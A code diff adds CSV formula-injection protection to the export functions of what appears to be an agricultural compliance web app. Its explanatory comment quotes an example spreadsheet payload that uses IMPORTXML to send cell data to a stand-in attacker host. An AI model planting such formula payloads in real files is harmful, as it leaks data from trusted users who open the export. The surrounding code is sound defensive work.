@@ -2904,11 +2904,34 @@ def create_pilot_feedback(
 
 
 # ------------------------------------------------------------------- Exports
+# Spreadsheet apps (Excel, LibreOffice Calc, Google Sheets) evaluate any cell whose
+# first character is one of these as a formula on open — so a free-text field a grower
+# typed (product name, notes, agronomist comment, pilot-feedback pain point) can carry
+# a payload like `=IMPORTXML("http://attacker/?leak="&A1,"//")` or a Windows DDE
+# process-launch string straight into the CSV a PCA downloads for compliance. These
+# exports are the whole point of the audit trail, so the recipient is exactly a
+# high-trust user opening the file. OWASP's fix: prefix a formula-triggering cell so the
+# spreadsheet treats it as text, never as a formula.
+_CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@")
+
+
+def _sanitise_csv_cell(value):
+    """Neutralise CSV formula injection in string cells; pass other types through.
+
+    A leading tab keeps the value human-readable and round-trips as text rather than a
+    formula. Numbers and booleans cannot carry formula syntax, so they are untouched —
+    prefixing them would corrupt a legitimately numeric column.
+    """
+    if isinstance(value, str) and value[:1] in _CSV_FORMULA_TRIGGERS:
+        return "\t" + value
+    return value
+
+
 def _csv_response(filename: str, header: list[str], rows: list[list]) -> Response:
     buf = io.StringIO()
     writer = csv.writer(buf)
     writer.writerow(header)
-    writer.writerows(rows)
+    writer.writerows([_sanitise_csv_cell(cell) for cell in row] for row in rows)
     return Response(
         content=buf.getvalue(),
         media_type="text/csv",
